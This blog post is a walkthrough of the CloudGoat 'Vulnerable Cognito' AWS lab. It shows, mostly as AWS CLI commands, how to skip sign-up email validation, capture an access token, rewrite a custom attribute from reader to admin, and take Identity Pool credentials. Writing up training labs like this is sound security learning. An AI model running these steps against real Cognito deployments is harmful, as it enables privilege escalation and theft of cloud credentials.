---
title:  "CloudGoat: Vulnerable Cognito"
date:   2024-03-09
tags: cloudsecurity cybersecurity aws
last_modified_at: 2024-03-09
---

In this scenario, we have the login and signup page which used AWS Cognito Userpool as a backend to store a user data, and AWS Cognito IdentityPool which use Userpool as an identity provider. We can take advantage from misconfiguration of the AWS Cognito Userpool to get the AWS Cognito IdentityPool credentials.

## Sign up with desired email

After creating the scenario, you will get the url for index/login page. When you try to sign up with our desired email, you will get an error from email validation.

If you look at the html code of login page, you will find `ClientID` in it.

We can use the `ClientID` to bypass the email validation by using aws cli.
```shell
aws cognito-idp sign-up --client-id <client-id> --username <email> --password <password> --user-attributes '[{"Name":"given_name","Value":"lorem"},{"Name":"family_name","Value":"ipsum"}]' --region us-east-1
```

After signing up, you will get the confirmation code in your email.

To verify the user.
```shell
aws cognito-idp confirm-sign-up --client-id <client-id> --username <email> --confirmation-code <confirmation-code>
```

## Get Access Token
Now when we log in again, it will redirect us to the reader page (`reader.html`). This doesn't give us any information.

So we will explore more about the user with cli, but we need the access token.

We will capture the network packet to get the access token. There are many ways to do that.
- Burp Suite
- Network in Developer tools in web browser

For me, I use Chrome.

After we opened network tab in web browser, go back to login back and login with email and password again. Now you will see the access token. This happens when browser post to `cognito-idp.region.amazonaws.com`.

```json
{
    "AccessToken":"###"
}
```

I'm not sure whether we can get the access token in cookies or not, so I use the way above instead. {: .notice}

## Get user detail
To get user data
```shell
aws cognito-idp get-user --access-token <access-token>
```

Result:
```json
{
    "Username": "24f0eab5-09f4-4395-bcbf-b6e1a18e887a",
    "UserAttributes": [
        {
            "Name": "custom:access",
            "Value": "reader"
        },
        {
            "Name": "sub",
            "Value": "24f0eab5-09f4-4395-bcbf-b6e1a18e887a"
        },
        {
            "Name": "email_verified",
            "Value": "true"
        },
        {
            "Name": "given_name",
            "Value": "lorem"
        },
        {
            "Name": "family_name",
            "Value": "ipsum"
        },
        {
            "Name": "email",
            "Value": "badix10958@fashlend.com"
        }
    ]
}
```

We can see that one of the custom attributes is `custom:access`. Right now, our user is `reader`. If you investigate further in the html code in the login page, you will see that the user can be `admin`.

```js
if(access == 'admin'){
    window.location = "./admin.html";
}
else{
    window.location = "./reader.html"
}
```

## Change the custom attribute
We will change `custom:access` from `reader` to `admin`
```shell
aws cognito-idp update-user-attributes --access-token <access-token>  --user-attributes '[{"Name":"custom:access","Value":"admin"}]'
```

Now we got `admin` access.

This time we loged in again, it redirected us to admin page instead.

## Get Cognito Identity Credentials

After we were redirected to admin, if you check on Network tab in Developer tools, you will see `IdentityId` and cognito identity login url with `UserPoolId` and `idToken` of this user

```json
{
    "Logins": {
        "cognito-idp.<region>.amazonaws.com/{UserPoolId}": "<idToken>"
    },
    "IdentityId": "<IdentityId>"
}
```

Now we can get credentials from this user.
```shell
aws cognito-identity get-credentials-for-identity --region <region> --identity-id '<Id-found>' --logins "cognito-idp.<region>.amazonaws.com/<UserPoolId>=<idToken>"
```

Result:
```json
{
    "IdentityId": "us-east-1:43d6ab63-259f-c188-cc7d-18b40508783e",
    "Credentials": {
        "AccessKeyId": "AccessKeyId",
        "SecretKey": "SecretKey",
        "SessionToken": "SessionToken"
    }
}
```

We can create aws cli profile from this credentials. If you don't know how <a href="{% post_url 2024-03-05-cloudgoat-vulnerable-lambda %}">see here</a>

And with this credentials, we will get an assumed role `cognito_authenticated-vulnerable_cognito_###`

Thank you so much for reading until here. If you have any comments, suggestions, or recommendations, please reach me out at my [LinkedIn](https://www.linkedin.com/in/chayutpongpro/).

![mojito](/assets/images/mojito.jpg)
<sub><a href="https://unsplash.com/@kobbymendez?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">Kobby Mendez</a> | <a href="https://unsplash.com/photos/three-clear-glass-cups-with-juice-xBFTjrMIC0c?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">Unsplash</a></sub>
{: .text-center}
